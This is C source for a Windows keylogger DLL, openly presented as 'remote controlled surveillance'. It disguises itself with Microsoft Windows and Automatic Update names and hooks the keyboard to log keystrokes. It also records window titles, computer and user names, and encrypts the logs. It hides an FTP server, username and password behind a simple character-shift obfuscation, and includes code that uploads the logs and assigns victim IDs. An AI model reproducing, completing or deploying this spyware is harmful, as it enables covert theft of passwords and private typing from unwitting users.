
// Library for Remote Controlled Surveillance & Administration
// of Windows based computers. Program written by Arjun Menon.

#include <windows.h>
#include <wininet.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

/*********************.
| Function Prototypes |
`*********************/

__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
__declspec(dllexport) void AutomaticUpdate
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
BOOL APIENTRY DllMain(HINSTANCE hModule, 
DWORD reason_for_call, LPVOID reserved);

/* System Surveillance Program */
void WINAPI StartSurveillance(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow);
LRESULT CALLBACK SurveillanceWP
(HWND hwnd, UINT message,WPARAM wParam,LPARAM lParam);
void StoreInformation(char *str);
LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam);
void CALLBACK WindowTimer(HWND hwnd, 
UINT message, UINT iTimerID, DWORD dwTime);
void CALLBACK TimeStamp(HWND hwnd, 
UINT message, UINT iTimerID, DWORD dwTime);

/* Information Storage Program */
DWORD WINAPI StartStorage(PVOID pParam);
void WINAPI StorageProc(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow);
LRESULT CALLBACK StorageWP (HWND hwnd, UINT message,
WPARAM wParam,LPARAM lParam);
void CALLBACK WriteTimer(HWND hwnd, 
UINT message, UINT iTimerID, DWORD dwTime);
void CALLBACK UpdateTimer (HWND hwnd, 
UINT message, UINT iTimerID, DWORD dwTime);
inline char UploadLog(unsigned long int no);
inline unsigned long int GetCompId(HINTERNET hFtp);

/* Common Application Services */
HWND MakeSillyWindow(HINSTANCE hInstance, 
WNDPROC WndProc, LPCTSTR WndName);
void fix(char *s);
void InitializeStrings();
void SimpleEncrypt(char *str, const unsigned long int n, const char *key);
void CQ_insert(char val);
bool CQ_delete(char *val);
void CQ_instr(char *str);

/********************************.
| Global Variables and Constants |
`********************************/

#define STR_SZ1 64
#define STR_SZ2 512
#define MAX_FSZ 4096
#define MSG(M) MessageBox(NULL,"",M,0);
#define BEEP   MessageBeep(-1);

const char AppName[] = "Microsoft� Windows� Operating System";
const char AppName2[] = "Microsoft� Windows� Automatic Update";
char Password[] = "a";
char BaseDirectory[MAX_PATH];

HANDLE hDLL = NULL;
HHOOK KeyHook = NULL;

#define WINDOW_TIMER  100
#define TIME_STAMP    60000
#define UPDATE_TIMER  3000
#define WRITE_TIMER   1000

char LocLogFileExt[] = "*ibh";
char LogCountFile[] = "]llicip*ouo";
char SrvLogFileExt[] = "*ceb";
char UplinkCountFile[] = "qe_kna/.*ouo";
char LocIdFile[] = "_onoo*ouo";
char SrvIdFile[] = "_kqjp*ceb";
char InternetCheckMask[] = "dppl6++sss*ie_nkokbp*_ki";
char FtpServer[] = "sss*ejpanhejg*-1,i*_ki";
char FtpUserName[] = "ejpanhejg*-1,i*_ki";
char FtpPassword[] = "Ecjeo=qnqiLnk^]p";

/***************************.
| Exported DLL Entry Points |
`***************************/

__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	InitializeStrings();
	StartSurveillance((HINSTANCE)hDLL, NULL, lpszCmdLine, SW_NORMAL);
}

BOOL APIENTRY DllMain
(HINSTANCE hModule, DWORD reason_for_call, LPVOID reserved)
{
	hDLL = hModule;
	return TRUE;
}

/*****************************.
| System Surveillance Program |
`*****************************/

void WINAPI StartSurveillance(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow)
{
	HWND hWnd = MakeSillyWindow
		(hInstance,SurveillanceWP,AppName);
	ShowWindow(hWnd, nCmdShow);

	MSG msg; /* the message catcher... */
	while(GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

LRESULT CALLBACK SurveillanceWP(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		TimeStamp(NULL,0,0,0);
		SetTimer(hWnd, 1, WINDOW_TIMER, WindowTimer);
		SetTimer(hWnd, 2, TIME_STAMP, TimeStamp);
		///////////////////////
		// Start Surveillance
		///////////////////////
		{
			/* start the keylogger */
			KeyHook = SetWindowsHookEx(WH_KEYBOARD,
			(HOOKPROC)KeyboardHookProc,(HINSTANCE)hDLL,(DWORD)NULL);
			/* start the storage */
			DWORD UpdThreadId = 0;
			CreateThread(NULL,0,StartStorage,NULL,0,&UpdThreadId);
		}
		break;
	case WM_CLOSE:
		KillTimer(hWnd, 1);
		KillTimer(hWnd, 2);
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}
	return DefWindowProc(hWnd, message, wParam, lParam) ;
}

FILE * GetLogFile()
{
	return fopen("d:\\report.txt","a+");
}

LRESULT CALLBACK KeyboardHookProc(int code, WPARAM wParam, LPARAM lParam)
{
	char keyw[20];
	if (((DWORD)lParam & 0x40000000) &&(HC_ACTION==code))
	{
		FILE *LogFile = GetLogFile();
		if(LogFile != NULL) {
			if ((wParam==VK_SPACE)||(wParam>=0x2f)&&(wParam<=0x100)) 
			{
				if (wParam==VK_RETURN)
				{
					*keyw='\n';
					fwrite(keyw,1,1,LogFile);
				}
				else
				{
					BYTE ks[256];
					GetKeyboardState(ks);
					WORD w;
					UINT scan=0;
					ToAscii(wParam,scan,ks,&w,0);
					*keyw = char(w);
					fwrite(keyw,1,1,LogFile);
				}
			}
			else switch(wParam)
			{
				case VK_CANCEL:    strcpy(keyw,"[CTRL-BRK]"); break;
				case VK_BACK:      strcpy(keyw,"[BACK]"); break;
				case VK_TAB:       strcpy(keyw,"[TAB]"); break;
				case VK_CLEAR:     strcpy(keyw,"[CLEAR]"); break;
				case VK_RETURN:    strcpy(keyw,"[ENTER]\r\n"); break;
				case VK_SHIFT:     strcpy(keyw,"[SHIFT]"); break;
				case VK_CONTROL:   strcpy(keyw,"[CTRL]"); break;
				case VK_MENU:      strcpy(keyw,"[ALT]"); break;
				case VK_PAUSE:     strcpy(keyw,"[PAUSE]"); break;
				case VK_CAPITAL:   strcpy(keyw,"[CapsLock]"); break;
				case VK_ESCAPE:    strcpy(keyw,"[ESC]"); break;
				case VK_PRIOR:     strcpy(keyw,"[PageUp]"); break;
				case VK_NEXT:      strcpy(keyw,"[PageDown]"); break;
				case VK_END:       strcpy(keyw,"[END]"); break;
				case VK_HOME:      strcpy(keyw,"[HOME]"); break;
				case VK_LEFT:      strcpy(keyw,"[LEFT]"); break;
				case VK_UP:        strcpy(keyw,"[UP]"); break;
				case VK_RIGHT:     strcpy(keyw,"[RIGHT]"); break;
				case VK_DOWN:      strcpy(keyw,"[DOWN]"); break;
				case VK_SELECT:    strcpy(keyw,"[SELECT]"); break;
				case VK_EXECUTE:   strcpy(keyw,"[EXECUTE]"); break;
				case VK_SNAPSHOT:  strcpy(keyw,"[PrintScreen]"); break;
				case VK_INSERT:    strcpy(keyw,"[INSERT]"); break;
				case VK_DELETE:    strcpy(keyw,"[DELETE]"); break;
				case VK_HELP:      strcpy(keyw,"[HELP]"); break;
				case VK_LWIN:      strcpy(keyw,"[LeftWindowsKey]"); break;
				case VK_RWIN:      strcpy(keyw,"[RightWindowsKey]"); break;
				case VK_APPS:      strcpy(keyw,"[ApplicationKey]"); break;
				case VK_MULTIPLY:  strcpy(keyw,"[MULTIPLY]"); break;
				case VK_ADD:       strcpy(keyw,"[ADD]"); break;
				case VK_SEPARATOR: strcpy(keyw,"[SEPERATOR]"); break;
				case VK_SUBTRACT:  strcpy(keyw,"[SUBTRACT]"); break;
				case VK_DECIMAL:   strcpy(keyw,"[DECIMAL]"); break;
				case VK_DIVIDE:    strcpy(keyw,"[DIVIDE]"); break;
				case VK_NUMLOCK:   strcpy(keyw,"[NumLock]"); break;
				case VK_SCROLL:    strcpy(keyw,"[ScrollLock]"); break;
				case VK_ATTN:      strcpy(keyw,"[ATTN]"); break;
				case VK_CRSEL:     strcpy(keyw,"[CrSel]"); break;
				case VK_EXSEL:     strcpy(keyw,"[ExSel]"); break;
				case VK_EREOF:     strcpy(keyw,"[EraseEOF]"); break;
				case VK_PLAY:      strcpy(keyw,"[PLAY]"); break;
				case VK_ZOOM:      strcpy(keyw,"[ZOOM]"); break;
				default: sprintf(keyw,"[(%d)%c]",wParam,wParam); break;
				fwrite(keyw,1,strlen(keyw),LogFile);
			}
			fclose(LogFile);
		}
	}
	return CallNextHookEx(KeyHook, code, wParam, lParam);
}

void CALLBACK WindowTimer(HWND hwnd, UINT message, UINT iTimerID, DWORD dwTime)
{
	static HWND ForegroundWindow = NULL;
	static char *PreviousWindowName = NULL;
	BOOL has_changed = FALSE;

	if(GetForegroundWindow() != ForegroundWindow) {
		has_changed = TRUE;
		ForegroundWindow = GetForegroundWindow();
	}

	/* get WindowName */
	int size = GetWindowTextLength(ForegroundWindow)+1;
	char *WindowName = (char *)calloc(size,sizeof(char));
	size = GetWindowText(ForegroundWindow, WindowName, size);

	if(PreviousWindowName != NULL && WindowName != NULL) {
		if(strcmp(PreviousWindowName, WindowName))
			has_changed = TRUE;
	} else  has_changed = TRUE;

	if(has_changed)
	{
		if(PreviousWindowName)
			free(PreviousWindowName);
		if(WindowName) {
			if(strlen(WindowName)) {
				char *str = (char *)calloc
				((size+STR_SZ1)+STR_SZ2,sizeof(char));
				sprintf(str,"\n\r%s\n",WindowName);
				StoreInformation(str);
				free(str);
			}
		}
	}
	PreviousWindowName = WindowName;
}

void CALLBACK TimeStamp(HWND hwnd, UINT message, UINT iTimerID, DWORD dwTime)
{
	char *str = (char *)calloc(STR_SZ2+20,1),
	     *sub = (char *)calloc(STR_SZ2,1);

	static char time_stamp = 0;
	if(!(time_stamp%5)) {
		time_stamp++;
		// for every 5 calls stamp time & date...
		TIME_ZONE_INFORMATION here;
		SYSTEMTIME utc, local;
		GetTimeZoneInformation(&here);
		GetLocalTime(&local);
		GetSystemTime(&utc);
		char AM_PM[3];
		if(local.wHour>12) {
			strcpy(AM_PM,"PM");
			local.wHour -= 12;
		} else strcpy(AM_PM,"AM");
		sprintf(sub,
		"%u/%u/%u %u:%u:%u %s (%uH%uM GMT)",
		local.wDay,local.wMonth,local.wYear,
		local.wHour,local.wMinute,local.wSecond,
		AM_PM,utc.wHour,utc.wMinute);
		// write the time & date...
		sprintf(str,"\n\rTime %s\n",sub);
		StoreInformation(str);
	}
	static char system_stamp = 0;
	if(!(system_stamp%15)) {
		system_stamp++;
		// for every 15 calls do this....
		unsigned long int bsize = STR_SZ2;
		if( !GetComputerName(sub,&bsize) ) {
			sub = (char *) realloc (sub, bsize);
			GetComputerName(sub,&bsize);
		}
		sprintf(str," # Computer Name: %s\r\n",sub);
		StoreInformation(str);
		if( !GetUserName(sub,&bsize) ) {
			sub = (char *) realloc (sub, bsize);
			GetUserName(sub,&bsize);
		}
		sprintf(str," # User Name: %s\r\n",sub);
		StoreInformation(str);
		// get OS name & version ...
		OSVERSIONINFO ya;
		ya.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		if( GetVersionEx(&ya) ) {
			sprintf(str," # Version %u.%u Build %u ",
				ya.dwMajorVersion,
				ya.dwMinorVersion,
				ya.dwBuildNumber);
			if(ya.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
				strcat(str,"Windows 9x ");
			else if(ya.dwPlatformId == VER_PLATFORM_WIN32_NT)
				strcat(str,"Windows NT ");
			strcat(str,ya.szCSDVersion);
			StoreInformation(str);
		}
	}
	free(sub);
	free(str);
}

/*****************************.
| Information Storage Program |
`*****************************/

DWORD WINAPI StartStorage(PVOID pParam)
{
	StorageProc((HINSTANCE)hDLL, NULL, NULL, SW_NORMAL);
	return 0;
}

void WINAPI StorageProc(HINSTANCE hInstance, 
					   HINSTANCE hPrevInstance, 
					   PSTR szCmdLine, int nCmdShow)
{
     HWND hWnd = MakeSillyWindow
		 (hInstance,StorageWP,AppName2);
	 ShowWindow(hWnd, nCmdShow);

	 MSG msg; /* the message catcher... */
     while(GetMessage(&msg, NULL, 0, 0))
	 {
          TranslateMessage(&msg);
          DispatchMessage(&msg);
     }
}

LRESULT CALLBACK StorageWP(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		//SetTimer(hWnd, 1, UPDATE_TIMER, UpdateTimer);
		SetTimer(hWnd, 2, WRITE_TIMER, WriteTimer);
		break;
	case WM_CLOSE:
		//KillTimer(hWnd, 1);
		KillTimer(hWnd, 2);
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		PostQuitMessage (0);
		return 0;
	}
	return DefWindowProc (hWnd, message, wParam, lParam) ;
}

bool Access_Semaphore = false;

void StoreInformation(char *str)
{
	/* open a file in HDD of max. size MAX_FSZ,
	   and writes the string 'str' to the file.
	   Files have names that are numbered in 
	   hexadecimal and are encrypted. */

	if(Access_Semaphore == true)
		while(Access_Semaphore);
	else
		Access_Semaphore = true;

	SimpleEncrypt(str,strlen(str),Password);
	CQ_instr(str);
	MessageBeep(-1);

	Access_Semaphore = false;
}

void CALLBACK WriteTimer(HWND hwnd, UINT message, UINT iTimerID, DWORD dwTime)
{
	if(Access_Semaphore == true)
		while(Access_Semaphore);
	else
		Access_Semaphore = true;

	char k; while(CQ_delete(&k)) {
	FILE *t = fopen("D:\\log.mfl","ab");
	fwrite(&k,1,1,t); fclose(t); }

	Access_Semaphore = false;
}

void CALLBACK UpdateTimer(HWND hwnd, UINT message, UINT iTimerID, DWORD dwTime)
{
	static BOOL semaphore = FALSE;
	if(semaphore == TRUE)
		return;
	else
		semaphore = TRUE;

	static FILE *uf = NULL;
	if(uf == NULL) {
		char fname[MAX_PATH];
		sprintf(fname,"%s%s",BaseDirectory,UplinkCountFile);
		uf = fopen(fname,"r+b");
		if(uf == NULL) {
			uf = fopen(fname,"w+b");
			if(uf == NULL) {
				semaphore = FALSE;
				return;
			}
			unsigned long int one = 1;
			fwrite(&one, sizeof(unsigned long int), 1, uf);
			rewind(uf);
		}
	}
	// fing log file limit...
	unsigned long int limit = 0;
	FILE *cf = NULL;
	auto char cfname[STR_SZ2];
	sprintf(cfname,"%s%s",BaseDirectory,LogCountFile);
	cf = fopen(cfname,"r+b");
	if(cf != NULL) {
		fread(&limit, sizeof(unsigned long int), 1, cf);
		fclose(cf);
	}
	unsigned long int current = 0;
	fread(&current, sizeof(unsigned long int), 1, uf);
	rewind(uf);
	if(current < limit) {
		if( UploadLog(current) ) {
			// file was uploaded successfully
			current++;
			fwrite(&current, sizeof(unsigned long int), 1, uf);
			rewind(uf);
		}
	}
	semaphore = FALSE;
}

inline char UploadLog(unsigned long int no)
{
	/* this function will transfer the log 
	   files one by one to the FTP server */

	static BOOL semaphore = FALSE;
	if(semaphore == TRUE)
		return 0;
	else
		semaphore = TRUE;

	if(InternetCheckConnection(InternetCheckMask,FLAG_ICC_FORCE_CONNECTION,0))
	{
		/* connect me to the internet */
		HINTERNET hNet = InternetOpen(AppName2, PRE_CONFIG_INTERNET_ACCESS,
			NULL, INTERNET_INVALID_PORT_NUMBER, 0 );
		if(hNet != NULL)
		{
			/* connect me to the remote FTP Server */
			HINTERNET hFtp = InternetConnect(hNet,FtpServer,
				INTERNET_DEFAULT_FTP_PORT,FtpUserName,FtpPassword,
				INTERNET_SERVICE_FTP, 0, 0);
			if(hFtp != NULL)
			{
				/* successful connection to FTP server established */
				char local_file[MAX_PATH], remote_file[MAX_PATH];
				sprintf(local_file,"%s%lX%s",BaseDirectory,no,LocLogFileExt);
				sprintf(remote_file,"%lu-%lX%s",GetCompId(hFtp),no,SrvLogFileExt);
				//MessageBox(NULL,local_file,remote_file,0);
				if(FtpPutFile(hFtp, local_file, remote_file, 0, 0))
				{
					/* file transfer OK */
					InternetCloseHandle(hFtp);
					InternetCloseHandle(hNet);
					semaphore = FALSE;
					return 1;
				}
				else {
					/* file transfer failed */
					InternetCloseHandle(hFtp);
					InternetCloseHandle(hNet);
					semaphore = FALSE;
					return 0;
				}
			}
			else {
				/* connection to FTP server failed */
				InternetCloseHandle(hNet);
				semaphore = FALSE;
				return 0;
			}
		}
		else {
			/* connection to internet failed */
			semaphore = FALSE;
			return 0;
		}
	}
	/* internet connection is not available 
	   either because the person is not online
	   or because a firewall has blocked me */
	semaphore = FALSE;
	return 0;
}

inline unsigned long int GetCompId(HINTERNET hFtp)
{
	/* this function returns an ID number (postive integer) 
	   that can be used to uniquely identify this 
	   computer on a particulat FTP server. */

	unsigned long int cid = 0;
	char retrieve_id = 0;
	char idf_name[MAX_PATH];
	sprintf(idf_name,"%s%s",BaseDirectory,LocIdFile);

	FILE *idf = NULL;
	if((idf = fopen(idf_name,"r+b")) != NULL)
	{
		if(fread(&cid,sizeof(unsigned long int),1,idf))
		{
			// Got the ID number
			fclose(idf);
			return cid;
		}
		else {
			fclose(idf);
			retrieve_id = 1;
		}
	}
	else
		retrieve_id = 1;

	/* this a new computer, so
	   we have to make a new
	   ID number for it. */
	if(retrieve_id)
	{
		/* this code is executed ONLY ONCE
		   after the installion / first run. */
		if(FtpGetFile(hFtp, SrvIdFile, idf_name, FALSE, 
			NULL, FTP_TRANSFER_TYPE_BINARY, 0))
		{
			/* the FTP server has been established
			   previously by some other computer */
			if((idf = fopen(idf_name,"r+b")) != NULL)
			{
				if(fread(&cid,sizeof(unsigned long int),1,idf))
				{
					// Got the old ID number, now set the new ID number
					rewind(idf);
					cid++;
					fwrite(&cid,sizeof(unsigned long int),1,idf);
					fclose(idf);
					// Now update the FTP server with new ID number
					FtpPutFile(hFtp, idf_name, SrvIdFile, 0, 0);
					return cid;
				}
				else // file downloaded from FTP 
				{    //  server is not an ID file
					fclose(idf);
					return cid;
				}
			}
			else // can't open local ID file
				return cid;
		}
		else
		{
			/* the FTP server is fresh, so now we
			   must establish our presence there */
			if((idf = fopen(idf_name,"w+b")) != NULL)
			{
				/* setup the local ID  number file 
				   with the initial value = 1 */
				cid = 1;
				fwrite(&cid,sizeof(unsigned long int),1,idf);
				fclose(idf);
				FtpPutFile(hFtp, idf_name, SrvIdFile, 0, 0);
				return cid;
			}
		}
	}
	// we already have an ID number
	return cid;
}

/*****************************.
| Common Application Services |
`*****************************/

HWND MakeSillyWindow(HINSTANCE hInstance, WNDPROC WndProc, LPCTSTR WndName)
{
     WNDCLASS    wndclass ;

     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc;
     wndclass.cbClsExtra    = 0;
     wndclass.cbWndExtra    = 0;
     wndclass.hInstance     = hInstance;
     wndclass.hIcon         = LoadIcon (NULL, IDI_WINLOGO);
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW);
     wndclass.hbrBackground = (HBRUSH) COLOR_BTNFACE;
     wndclass.lpszMenuName  = NULL;
     wndclass.lpszClassName = WndName;

     if (!RegisterClass (&wndclass))
          return NULL ;

     return CreateWindow (WndName, WndName,
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, hInstance, NULL) ;
}

void fix(char *s) { while(*s!='\0') *(s++) = (char)((char)(*s) + 4); }

void InitializeStrings()
{
	fix(LocLogFileExt);
	fix(LogCountFile);
	fix(SrvLogFileExt);
	fix(UplinkCountFile);
	fix(LocIdFile);
	fix(SrvIdFile);
	fix(InternetCheckMask);
	fix(FtpServer);
	fix(FtpUserName);
	fix(FtpPassword);

	// to get BaseDirectory
	GetSystemDirectory(BaseDirectory,MAX_PATH);
	strcat(BaseDirectory,"\\srvdat\\");
	CreateDirectory(BaseDirectory,NULL);
}

void SimpleEncrypt(char *str, const unsigned long int n, const char *key)
{
	register unsigned int i = 0;
	// take complement of array
	for(i=0;i<n;i++) str[i] = (char)(~(char)(str[i]));
	const int keylen = strlen(key);
	for(i=0;i<n;i++) /* XOR encryption */
	str[i] = (char)((char)(str[i])^(char)(key[i%keylen]));
}

////////////////////
// Character Queue
////////////////////

struct CQ_node
{
	char value;
	struct CQ_node * link;
}
*CQ_front = NULL,
*CQ_rear = NULL;

void CQ_insert(char val)
{
	struct CQ_node *temp = (struct CQ_node *)
		malloc (sizeof(struct CQ_node));
	temp ->link = NULL;
	temp ->value = val;
	// check if allocated
	if(temp != NULL)
	{
		if(CQ_rear == NULL || CQ_front == NULL)
			// first time execution
			CQ_front = CQ_rear = temp;
		else {
			// add another element
			CQ_rear ->link = temp;
			CQ_rear = temp;
		}
	}
}

bool CQ_delete(char *val)
{
	if(CQ_front == NULL)
		return false;
	else {
		*val = CQ_front ->value;
		struct CQ_node * temp = CQ_front;
		CQ_front = CQ_front ->link;
		free(temp);
		return true;
	}
}

void CQ_instr(char *str)
{
	while(*str != '\0')
	CQ_insert(*(str++));
}
